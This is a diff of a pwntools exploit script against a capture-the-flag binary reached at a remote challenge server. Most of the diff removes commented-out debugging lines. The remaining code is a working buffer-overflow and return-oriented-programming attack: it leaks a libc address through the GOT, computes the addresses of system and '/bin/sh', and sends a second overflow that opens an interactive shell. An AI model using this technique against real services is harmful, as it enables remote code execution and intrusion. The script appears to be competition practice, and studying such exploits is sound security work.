@@ -4,14 +4,12 @@ pwnable = './chall'
 
 elf = ELF(pwnable)
 libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')
-#libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
 
 context(terminal=['tmux', 'new-window'])
 context(os = 'linux', arch = 'x86_64')
 
 context.log_level = 'DEBUG'
 
-#setarch $(uname -m) -R /bin/bash
 debug_set = ''
 
 debug_set_1 = '''
@@ -58,13 +56,9 @@ if len(sys.argv) > 2 and sys.argv[1] == 'debug':
     p = process(pwnable)
     gdb.attach(p, debug_set_3)
 elif len(sys.argv) > 1 and sys.argv[1] == 'debug':
-    #p = process("./seethefile", env=env)
-    #gdb.attach(p, debug_set_1)
     p = process(pwnable)
     gdb.attach(p, debug_set_4)
 else:
-    #p = process('./seethefile')
-    #env = {"LD_PRELOAD": os.path.join(os.getcwd(), "/root/libc_32.so.6")}
     #p = process(pwnable)
     p = remote('challs.xmas.htsp.ro', 12006)
 
@@ -73,7 +67,6 @@ else:
 
 p.recvuntil("?\n")
 p.sendline("aaaaaaaabaaaaaaaca" + p64(0x00401273) + p64(0x404018) + p64(0x401030) + p64(0x40115a))
-#p.sendline("aaaaaaaabaaaaaaacaaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaa")
 
 p.recvuntil("ing...\n")
 blah = p.recv(6) + "\x00\x00"
@@ -88,11 +81,8 @@ print("system :: " + hex(libc.sym['system']))
 
 rop_chain = ROP(pwnable)
 rop_chain.call(libc.sym['system'], [bin_shell])
-#rop_chain.call(libc.sym['system'], ['cat flag'])
 
 p.recvuntil("?\n")
 p.sendline("aaaaaaaabaaaaaaaca" + p64(0x00401273) + p64(bin_shell) + p64(libc.sym['system']))
 
-#p.sendline("aaaaaaaabaaaaaaaca" + str(rop_chain))
-#p.recvuntil("ing...\n")
 p.interactive()
